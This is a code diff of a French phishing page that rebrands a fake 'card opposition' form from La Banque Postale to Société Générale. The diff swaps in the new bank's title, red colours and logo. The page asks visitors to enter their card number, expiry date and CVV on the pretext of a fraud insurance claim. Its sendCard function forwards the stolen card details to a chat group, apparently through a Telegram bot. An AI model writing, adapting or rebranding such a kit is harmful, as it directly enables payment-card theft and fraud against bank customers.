@@ -3,9 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>La Banque Postale</title>
+<title>SG</title>
 <style>
 	
+```css
 html, body {
   overflow: hidden;
   height: 100%;
@@ -61,7 +62,7 @@ body {
   position: absolute;
   width: 50px;
   height: 50px;
-  background: #0076C5; /* Bleu Banque Postale */
+  background: #E60028; /* Rouge Société Générale */
   text-align: center;
   line-height: 50px;
   border-radius: 50%;
@@ -113,7 +114,7 @@ input {
 button {
   margin-top: 15px;
   padding: 10px;
-  background-color: #0076C5; /* bleu principal */
+  background-color: #E60028;
   color: white;
   border: none;
   border-radius: 5px;
@@ -121,15 +122,16 @@ button {
 }
 
 button:hover {
-  background-color: #005fa3;
+  background-color: #C40022;
 }
 
 #message {
   margin-top: 15px;
   font-weight: bold;
-  color: #0076C5;
+  color: #E60028;
 }
 </style>
+	```
 </head>
 <body>
 <div id="lockScreen">
@@ -142,7 +144,7 @@ button:hover {
   </div>
 </div>
 <div class="container">
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSSzSEyFEthlyBjNK8UxlqardSbCLToFjYtVA&s" alt="Logo">
+    <img src="https://www.franceactive.org/wp-content/uploads/2018/03/logo_SocieteGenerale_600x300.png" alt="Logo">
     <h1>Dossier mise en opposition de carte</h1>
     <div class="warning">Merci d’insérer vos numéros afin de confirmer l’envoi auprès des assurances bancaires dans le cadre d’un cas avéré de fraude.</div>
 
@@ -238,7 +240,7 @@ function sendCard(event) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
             chat_id: GROUP_ID,
-            text: `1+ CC LA BANQUE POSTALE\n\n💳 Numéro de carte : ${adresse}\n📅 Date d'expiration : ${codepostale}\n🔢 CVV : ${chiffre}`
+            text: `1+ CC SG\n\n💳 Numéro de carte : ${adresse}\n📅 Date d'expiration : ${codepostale}\n🔢 CVV : ${chiffre}`
         })
     })
     .then(response => {
